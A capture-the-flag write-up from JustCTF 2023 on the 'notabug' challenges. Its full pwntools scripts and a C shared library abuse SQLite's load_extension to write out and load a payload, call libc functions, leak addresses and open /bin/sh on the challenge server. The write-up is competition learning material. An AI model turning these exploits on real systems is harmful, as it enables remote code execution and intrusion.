---
title: "[JustCTF-2023] notabug"
date: 2023-05-31 20:56:00
tags: 
layout: default
---
# Prologue

r3kapig, 1st

# noabug

There is a new feature for sqlite that allows loading external libcs.

For challenge Notabug1, we can just load a external lib to execute arbitrary command.


exp.c:
```c
/* Add your header comment here */
#include <stdio.h>
#include <sqlite3ext.h> /* Do not use <sqlite3.h>! */
SQLITE_EXTENSION_INIT1

/* Insert your extension code here */

#ifdef _WIN32
__declspec(dllexport)
#endif
/* TODO: Change the entry point name so that "extension" is replaced by
** text derived from the shared library filename as follows:  Copy every
** ASCII alphabetic character from the filename after the last "/" through
** the next following ".", converting each character to lowercase, and
** discarding the first three characters if they are "lib".
*/
int sqlite3_extension_init(
  sqlite3 *db, 
  char **pzErrMsg, 
  const sqlite3_api_routines *pApi
){
  int rc = SQLITE_OK;
  SQLITE_EXTENSION_INIT2(pApi);
  /* Insert here calls to
  **     sqlite3_create_function_v2(),
  **     sqlite3_create_collation_v2(),
  **     sqlite3_create_module_v2(), and/or
  **     sqlite3_vfs_register()
  ** to register the new features that your extension adds.
  */
  return rc;
}
void exp()
{
    execve("/tmp/readflag",0,0);
}
//select Load_extension('/lib/x86_64-linux-gnu/libc.so.6','puts');
//select Load_extension('/jailed/readflag','_start');
//select cast("\x01\x02\x03\x04" as text) ;
```

exp.py
```py
from pwn import *
context.log_level='debug'
context.arch='amd64'
#context.terminal = ['tmux', 'splitw', '-h', '-F' '#{pane_pid}', '-P']
# p=process('./pwn')
import binascii
p = remote("0.0.0.0",13337)
ru         = lambda a:     p.readuntil(a)
r         = lambda n:        p.read(n)
sla     = lambda a,b:     p.sendlineafter(a,b)
sa         = lambda a,b:     p.sendafter(a,b)
sl        = lambda a:     p.sendline(a)
s         = lambda a:     p.send(a)
sla(b"> ",b"CREATE TABLE images(name TEXT, type TEXT, img BLOB);")
with open("./exp.so",'rb') as f:
    dt = f.read()
sla(b"> ",b"INSERT INTO images(name,type,img)")
dt = binascii.hexlify(dt)

print(dt.decode())

sla(b"> ",f"VALUES('icon','jpeg',cast(x'{dt.decode()}' as text));")
sla(b"> ",b"SELECT writefile('./exp.so',img) FROM images WHERE name='icon';")
sla(b"> ",b"select Load_extension('./exp','exp');")
p.interactive()
```

The above script works for the local one but not the remote one. My teammate found another way to compile it and make it work for the remote one.


# notabug2

We can also load libc.so.6 to execute arbitrary function but the parameters are fixed.

1.  I use puts to leak the PIE
2. Guess heap (1/0x2000) and build a fake structure on heap by function gets
3. system /bin/sh


```py
from pwn import *

context.log_level='debug'
p = remote("notabug2.nc.jctf.pro",1337)

ru         = lambda a:     p.readuntil(a)
r         = lambda n:        p.read(n)
sla     = lambda a,b:     p.sendlineafter(a,b)
sa         = lambda a,b:     p.sendafter(a,b)
sl        = lambda a:     p.sendline(a)
s         = lambda a:     p.send(a)



sla(b"lite>",b"select Load_extension('/lib/x86_64-linux-gnu/libc.so.6','puts');")
ru(": \n")
lic = u64(p.recvn(6).ljust(8,b'\x00'))
warning(hex(lic))
pie_base = lic - 0x1589a0

heap = 0x00005555556b0000-0x0000555555554000+pie_base # 1/0x2000

heap1 = 0x1150 + heap
heap2 = 0x103c0 + heap
# system_plt = (pie_base+0x2228C)
system_plt = pie_base + 0x10910
if pie_base > 0x600000000000:
    p.close()
warning(hex(pie_base)) #lic+0x28b8
sla(b"lite>",b"select Load_extension('/lib/x86_64-linux-gnu/libc.so.6','gets');")
p.sendline(p64(heap+0x11eb0)+b'a'*0x8+p64(pie_base+0x000000000009e0ad))
# raw_input()
dt = b"/bin/sh\0"+flat([0]*8)+ flat([0]*8)+ p64(system_plt)
sla(b"lite> ",f"select cast(x'{dt.hex()}' as text), ".encode()+b"Load_extension('"+p64(system_plt)[:6]+b"','/bin/sh');")
p.sendline(b"echo n132")
data = p.read(timeout=1)

if b'n132' in data:
    p.sendline("/jailed/readflag")
    p.read()
    input()
    p.interactive()
else:
    p.close()
```